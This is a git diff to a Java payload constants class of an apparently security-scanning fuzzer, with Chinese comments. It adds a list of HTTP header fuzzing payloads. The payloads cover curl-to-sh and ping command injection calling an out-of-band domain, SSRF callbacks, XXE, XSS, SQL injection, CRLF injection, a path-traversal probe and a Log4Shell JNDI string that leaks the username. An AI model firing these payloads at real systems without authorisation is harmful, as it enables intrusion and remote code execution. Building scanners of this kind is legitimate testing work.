@@ -3,7 +3,7 @@ import java.util.*;
 
 /**
  * 统一的Payload常量类
- * 用于ParamFuzzer和RouteFuzzer共享payload定义
+ * 用于ParamFuzzer、RouteFuzzer和HeaderFuzzer共享payload定义
  * 注意：这个类保持向后兼容性，但新的功能应该使用PayloadManager
  */
 public class PayloadConstants {
@@ -26,6 +26,26 @@ public class PayloadConstants {
      * 8K固定字符串用于随机测试
      */
     public static final String FIXED_8K_STRING = FixedStrings.FIXED_8K_STRING;
+
+    /**
+     * Header模糊测试专用的payload列表
+     */
+    public static final List<PayloadInfo> HEADER_PAYLOAD_INFOS = Arrays.asList(
+            new PayloadInfo("999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999", "999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999"),
+            new PayloadInfo("//etc/shells", "//etc/shells"),
+            new PayloadInfo("$(env)", "$(env)"),
+            new PayloadInfo("{fuzz}.ssrf.abga5.wi11.fun", "{hash}.ssrf.abga5.wi11.fun"),
+            new PayloadInfo("null", "null"),
+            new PayloadInfo("'`curl$IFS@{fuzz}.cmdi1.abga5.wi11.fun|sh`'$(curl$IFS@{fuzz}.cmdi1.abga5.wi11.fun|sh)", "'`curl$IFS@{hash}.cmdi1.abga5.wi11.fun|sh`'$(curl$IFS@{hash}.cmdi1.abga5.wi11.fun|sh)"),
+            new PayloadInfo("<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [!ENTITY delay SYSTEM \"http://httpbin.org/delay/7\"]><root>&delay;</root>", "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [!ENTITY delay SYSTEM \"http://httpbin.org/delay/7\"]><root>&delay;</root>"),
+            new PayloadInfo(");?/%ff'\"><img/src=http://ig{fuzz}.abga5.wi11.fun>", ");?/%ff'\"><img/src=http://ig{hash}.abga5.wi11.fun>"),
+            new PayloadInfo("&ping -c 4 {fuzz}.cmdi2.abga5.wi11.fun&'\"`0&ping -c 4 {fuzz}.cmdi2.abga5.wi11.fun&`'", "&ping -c 4 {hash}.cmdi2.abga5.wi11.fun&'\"`0&ping -c 4 {hash}.cmdi2.abga5.wi11.fun&`'"),
+            new PayloadInfo("1' OR /*!sleep*/(LENGTH('{fuzz}hb')); -- ", "1' OR /*!sleep*/(LENGTH('{hash}hb')); -- "),
+            new PayloadInfo("1' OR 1/0; -- ", "1' OR 1/0; -- "),
+            new PayloadInfo("chaxx123'\">*/*/=end'''\"\"\"[${$(`;\\abcc8d: g00f%0d%0ac9w: g00s%c4%8d%c4%8av5m: f00Java", "chaxx123'\">*/*/=end'''\"\"\"[${$(`;\\abcc8d: g00f%0d%0ac9w: g00s%c4%8d%c4%8av5m: f00Java"),
+            new PayloadInfo("${j${main:\\k5:-Nd}i${spring:k5:-:}ldap://${sys:user.name}-{fuzz}.l4j.abga5.wi11.fun/}", "${j${main:\\k5:-Nd}i${spring:k5:-:}ldap://${sys:user.name}-{hash}.l4j.abga5.wi11.fun/}")
+    );
+
     /**
      * 参数模糊测试专用的payload列表
      * 注意：这些是默认值，实际使用时应该通过PayloadManager获取启用的payloads
